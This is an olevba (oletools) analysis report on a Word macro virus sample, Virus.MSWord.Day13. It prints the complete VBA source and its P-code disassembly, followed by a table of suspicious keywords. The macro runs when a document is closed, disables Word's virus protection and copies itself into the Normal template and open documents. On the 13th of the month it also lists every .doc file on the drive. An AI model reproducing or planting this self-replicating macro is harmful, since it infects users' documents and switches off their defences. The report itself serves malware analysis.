olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Day13
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Day13 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Private strCode As String
Private Sub Document_Close()
On Error Resume Next
With Options
.SaveNormalPrompt = False
.VirusProtection = False
End With
Dim tdCode As Object
Set tdCode = GetCodeModule(ThisDocument)
With tdCode
strCode = .Lines(1, .CountOfLines)
End With
If ThisDocument = NormalTemplate Then
With ActiveDocument
If .Path <> vbNullString Then
SendCode ActiveDocument
.Save
End If
End With
Else
SendCode NormalTemplate
End If
If Day(Now) = 13 Then
With Application.FileSearch
.NewSearch
.LookIn = Left(NormalTemplate.FullName, 3)
.SearchSubFolders = True
.FileName = "*.doc"
.MatchTextExactly = False
.FileType = msoFileTypeAllFiles
.Execute
Dim i As Integer
For i = 1 To .FoundFiles.Count
MsgBox .FoundFiles(i)
Next i
End With
End If
End Sub
Private Function GetCodeModule(objProject As Object) As Object
Set GetCodeModule = objProject.VBProject.VBComponents(1).CodeModule
End Function
Private Sub SendCode(objProject As Object)
Dim objCode As Object
Set objCode = GetCodeModule(objProject)
With objCode
.DeleteLines 1, .CountOfLines
.InsertLines 1, strCode
End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Day13
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3356 bytes
' Line #0:
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	Dim (Private) 
' 	VarDefn strCode (As String)
' Line #3:
' 	FuncDefn (Private Sub Document_Close())
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #6:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #7:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #8:
' 	EndWith 
' Line #9:
' 	Dim 
' 	VarDefn tdCode (As Object)
' Line #10:
' 	SetStmt 
' 	Ld ThisDocument 
' 	ArgsLd GetCodeModule 0x0001 
' 	Set tdCode 
' Line #11:
' 	StartWithExpr 
' 	Ld tdCode 
' 	With 
' Line #12:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strCode 
' Line #13:
' 	EndWith 
' Line #14:
' 	Ld ThisDocument 
' 	Ld NormalTemplate 
' 	Eq 
' 	IfBlock 
' Line #15:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #16:
' 	MemLdWith Path 
' 	Ld vbNullString 
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld ActiveDocument 
' 	ArgsCall SendCode 0x0001 
' Line #18:
' 	ArgsMemCallWith Save 0x0000 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	EndWith 
' Line #21:
' 	ElseBlock 
' Line #22:
' 	Ld NormalTemplate 
' 	ArgsCall SendCode 0x0001 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #26:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #27:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	MemStWith LookIn 
' Line #28:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #29:
' 	LitStr 0x0005 "*.doc"
' 	MemStWith FileName 
' Line #30:
' 	LitVarSpecial (False)
' 	MemStWith MatchTextExactly 
' Line #31:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #32:
' 	ArgsMemCallWith Execute 0x0000 
' Line #33:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #35:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	ArgsCall MsgBox 0x0001 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #37:
' 	EndWith 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Private Function GetCodeModule(objProject As Object, id_FFFE As Object) As Object)
' Line #41:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld objProject 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set GetCodeModule 
' Line #42:
' 	EndFunc 
' Line #43:
' 	FuncDefn (Private Sub SendCode(objProject As Object))
' Line #44:
' 	Dim 
' 	VarDefn objCode (As Object)
' Line #45:
' 	SetStmt 
' 	Ld objProject 
' 	ArgsLd GetCodeModule 0x0001 
' 	Set objCode 
' Line #46:
' 	StartWithExpr 
' 	Ld objCode 
' 	With 
' Line #47:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld strCode 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #49:
' 	EndWith 
' Line #50:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

